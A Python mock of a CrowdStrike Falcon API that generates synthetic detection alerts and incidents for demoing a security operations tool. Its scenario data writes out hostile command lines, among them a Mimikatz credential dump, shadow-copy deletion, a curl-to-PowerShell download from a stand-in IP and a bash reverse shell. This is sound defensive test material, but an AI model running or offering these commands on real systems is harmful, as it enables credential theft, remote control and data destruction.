"""Mock Falcon backend that produces realistic sample alerts/incidents.

Lets you build and demo AISOC without touching a real CrowdStrike tenant.
Raw payloads mirror the shape of the real Alerts API v2 / Incidents API.
"""

import random
import threading
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any

from app.timeutil import parse_ts

MOCK_CID = "0123456789abcdef0123456789abcdef"

HOSTS: list[dict[str, Any]] = [
    {"device_id": "a1b2c3d4e5f60718293a4b5c6d7e8f90", "hostname": "WS-FIN-014", "platform_name": "Windows",
     "os_version": "Windows 11", "local_ip": "10.10.4.14", "external_ip": "198.51.100.24", "user": "CORP\\jsmith"},
    {"device_id": "b2c3d4e5f60718293a4b5c6d7e8f90a1", "hostname": "WS-HR-022", "platform_name": "Windows",
     "os_version": "Windows 10", "local_ip": "10.10.6.22", "external_ip": "198.51.100.24", "user": "CORP\\mlee"},
    {"device_id": "c3d4e5f60718293a4b5c6d7e8f90a1b2", "hostname": "SRV-DC-01", "platform_name": "Windows",
     "os_version": "Windows Server 2022", "local_ip": "10.10.0.10", "external_ip": "198.51.100.10", "user": "CORP\\svc_backup"},
    {"device_id": "d4e5f60718293a4b5c6d7e8f90a1b2c3", "hostname": "SRV-WEB-03", "platform_name": "Linux",
     "os_version": "Ubuntu 22.04", "local_ip": "10.20.1.3", "external_ip": "203.0.113.30", "user": "www-data"},
    {"device_id": "e5f60718293a4b5c6d7e8f90a1b2c3d4", "hostname": "LAPTOP-DEV-07", "platform_name": "Windows",
     "os_version": "Windows 11", "local_ip": "10.10.8.7", "external_ip": "198.51.100.24", "user": "CORP\\akhan"},
]

SCENARIOS: list[dict[str, Any]] = [
    {"display_name": "CredentialDumpingLsass", "severity": 90, "tactic": "Credential Access", "tactic_id": "TA0006",
     "technique": "OS Credential Dumping: LSASS Memory", "technique_id": "T1003.001", "platforms": ["Windows"],
     "description": "A process attempted to read LSASS memory, consistent with credential theft tools such as Mimikatz.",
     "filename": "mimikatz.exe", "cmdline": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
     "sha256": "61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1"},
    {"display_name": "EncodedPowerShell", "severity": 70, "tactic": "Execution", "tactic_id": "TA0002",
     "technique": "Command and Scripting Interpreter: PowerShell", "technique_id": "T1059.001", "platforms": ["Windows"],
     "description": "PowerShell launched with a hidden window and Base64-encoded command, a common malware loader pattern.",
     "filename": "powershell.exe",
     "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
     "sha256": "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"},
    {"display_name": "ShadowCopyDeletion", "severity": 95, "tactic": "Impact", "tactic_id": "TA0040",
     "technique": "Inhibit System Recovery", "technique_id": "T1490", "platforms": ["Windows"],
     "description": "Volume shadow copies were deleted, a hallmark of ransomware preparing to encrypt files.",
     "filename": "vssadmin.exe", "cmdline": "vssadmin.exe delete shadows /all /quiet",
     "sha256": "c2e6a9a3f2f6b1bd7d3a55e3a1c6f4f4b0f3b1b0e3f1a2b3c4d5e6f708192a3b"},
    {"display_name": "OfficeSpawnedShell", "severity": 60, "tactic": "Initial Access", "tactic_id": "TA0001",
     "technique": "Phishing: Spearphishing Attachment", "technique_id": "T1566.001", "platforms": ["Windows"],
     "description": "Microsoft Word spawned cmd.exe, indicating a possible malicious macro in an email attachment.",
     "filename": "cmd.exe", "cmdline": "cmd.exe /c \"curl -s http://198.51.100.77/i.ps1 | powershell -\"",
     "sha256": "b99d114b267ffd068c3289199b6df95a9f9e64872d6c2b666d63974bbce75bf2"},
    {"display_name": "CobaltStrikeBeacon", "severity": 85, "tactic": "Command and Control", "tactic_id": "TA0011",
     "technique": "Application Layer Protocol: Web Protocols", "technique_id": "T1071.001", "platforms": ["Windows"],
     "description": "rundll32 loaded an unsigned DLL and beaconed to an external host on a regular interval.",
     "filename": "rundll32.exe", "cmdline": "rundll32.exe C:\\Users\\Public\\update.dll,StartW",
     "sha256": "3f1d5e0c2b7a4c4e9c2f0d6a8b1e3c5d7f9a0b2c4d6e8f0a1b3c5d7e9f1a2b3c"},
    {"display_name": "PUPAdware", "severity": 30, "tactic": "Execution", "tactic_id": "TA0002",
     "technique": "User Execution: Malicious File", "technique_id": "T1204.002", "platforms": ["Windows"],
     "description": "A potentially unwanted program (adware bundler) was executed by the user.",
     "filename": "FreePDFConverterSetup.exe", "cmdline": "FreePDFConverterSetup.exe /silent",
     "sha256": "0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f9"},
    {"display_name": "ReverseShell", "severity": 75, "tactic": "Execution", "tactic_id": "TA0002",
     "technique": "Command and Scripting Interpreter: Unix Shell", "technique_id": "T1059.004", "platforms": ["Linux"],
     "description": "A web server process spawned an interactive shell connected to a remote IP (reverse shell).",
     "filename": "bash", "cmdline": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
     "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},
    {"display_name": "ScheduledTaskPersistence", "severity": 50, "tactic": "Persistence", "tactic_id": "TA0003",
     "technique": "Scheduled Task/Job: Scheduled Task", "technique_id": "T1053.005", "platforms": ["Windows"],
     "description": "A scheduled task was created to run a binary from a user-writable directory at logon.",
     "filename": "schtasks.exe",
     "cmdline": "schtasks.exe /create /tn \"OneDrive Update\" /tr C:\\Users\\Public\\odu.exe /sc onlogon /f",
     "sha256": "5d41402abc4b2a76b9719d911017c592ae2b6c0d1a8f3e4b5c6d7e8f9a0b1c2d"},
]


def _severity_name(sev: int) -> str:
    if sev >= 90:
        return "Critical"
    if sev >= 70:
        return "High"
    if sev >= 50:
        return "Medium"
    if sev >= 20:
        return "Low"
    return "Informational"


def _iso(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


class MockFalconClient:
    mode = "mock"

    def __init__(self, seed: int | None = None, initial_alerts: int = 10):
        self._rng = random.Random(seed)
        self._lock = threading.Lock()
        self._alerts: list[dict[str, Any]] = []
        self._initial_alerts = initial_alerts
        self._seeded = False

    # ------------------------------------------------------------------ auth
    def check_auth(self) -> dict[str, Any]:
        return {"ok": True, "mode": self.mode, "base_url": "mock://falcon"}

    # ---------------------------------------------------------------- alerts
    def _make_alert(self, created: datetime) -> dict[str, Any]:
        scenario = self._rng.choice(SCENARIOS)
        host = self._rng.choice([h for h in HOSTS if h["platform_name"] in scenario["platforms"]])
        aggregate = uuid.UUID(int=self._rng.getrandbits(128)).hex
        alert_id = f"ind:{host['device_id']}:{self._rng.getrandbits(40)}"
        sev = scenario["severity"]
        return {
            "composite_id": f"{MOCK_CID}:ind:{host['device_id']}:{aggregate}",
            "id": alert_id,
            "aggregate_id": f"aggind:{host['device_id']}:{aggregate}",
            "cid": MOCK_CID,
            "product": "epp",
            "type": "ldt",
            "status": "new",
            "display_name": scenario["display_name"],
            "name": scenario["display_name"],
            "description": scenario["description"],
            "severity": sev,
            "severity_name": _severity_name(sev),
            "confidence": self._rng.choice([60, 80, 90, 100]),
            "tactic": scenario["tactic"],
            "tactic_id": scenario["tactic_id"],
            "technique": scenario["technique"],
            "technique_id": scenario["technique_id"],
            "filename": scenario["filename"],
            "cmdline": scenario["cmdline"],
            "sha256": scenario["sha256"],
            "user_name": host["user"],
            "created_timestamp": _iso(created),
            "timestamp": _iso(created),
            "device": {
                "device_id": host["device_id"],
                "hostname": host["hostname"],
                "platform_name": host["platform_name"],
                "os_version": host["os_version"],
                "local_ip": host["local_ip"],
                "external_ip": host["external_ip"],
            },
            "falcon_host_link": f"https://falcon.crowdstrike.com/activity-v2/detections/{MOCK_CID}:ind:{host['device_id']}",
        }

    def fetch_alerts(self, since: datetime, limit: int) -> list[dict[str, Any]]:
        now = datetime.now(timezone.utc)
        with self._lock:
            if not self._seeded:
                for _ in range(self._initial_alerts):
                    self._alerts.append(self._make_alert(now - timedelta(minutes=self._rng.randint(5, 240))))
                self._seeded = True
            else:
                for _ in range(self._rng.choice([0, 0, 1, 1, 2])):
                    self._alerts.append(self._make_alert(now))
            self._alerts.sort(key=lambda a: a["created_timestamp"])
            matched = [a for a in self._alerts if (parse_ts(a["created_timestamp"]) or now) >= since]
            return [dict(a) for a in matched[:limit]]

    # ------------------------------------------------------------- incidents
    def fetch_incidents(self, since: datetime, limit: int) -> list[dict[str, Any]]:
        """Build one incident per host that has 2+ alerts."""
        with self._lock:
            by_host: dict[str, list[dict[str, Any]]] = {}
            for a in self._alerts:
                by_host.setdefault(a["device"]["device_id"], []).append(a)

        incidents: list[dict[str, Any]] = []
        for device_id, alerts in by_host.items():
            if len(alerts) < 2:
                continue
            alerts.sort(key=lambda a: a["created_timestamp"])
            modified = parse_ts(alerts[-1]["created_timestamp"])
            if modified is None or modified < since:
                continue
            host = alerts[0]["device"]
            incidents.append({
                "incident_id": f"inc:{device_id}:{uuid.uuid5(uuid.NAMESPACE_OID, device_id).hex}",
                "cid": MOCK_CID,
                "name": f"Incident on {host['hostname']}",
                "description": f"{len(alerts)} related detections on {host['hostname']}",
                "fine_score": min(100, max(a["severity"] for a in alerts) + 5 * (len(alerts) - 1)),
                "status": 20,  # 20 = New
                "state": "open",
                "hosts": [{"device_id": device_id, "hostname": host["hostname"],
                           "platform_name": host["platform_name"]}],
                "tactics": sorted({a["tactic"] for a in alerts}),
                "techniques": sorted({a["technique"] for a in alerts}),
                "start": alerts[0]["created_timestamp"],
                "end": alerts[-1]["created_timestamp"],
                "modified_timestamp": alerts[-1]["created_timestamp"],
            })
        incidents.sort(key=lambda i: i["modified_timestamp"])
        return incidents[:limit]

    # ----------------------------------------------------------------- hosts
    def get_hosts(self, device_ids: list[str]) -> list[dict[str, Any]]:
        wanted = set(device_ids)
        return [
            {
                "device_id": h["device_id"],
                "hostname": h["hostname"],
                "platform_name": h["platform_name"],
                "os_version": h["os_version"],
                "local_ip": h["local_ip"],
                "external_ip": h["external_ip"],
                "status": "normal",
                "last_seen": _iso(datetime.now(timezone.utc)),
            }
            for h in HOSTS
            if h["device_id"] in wanted
        ]

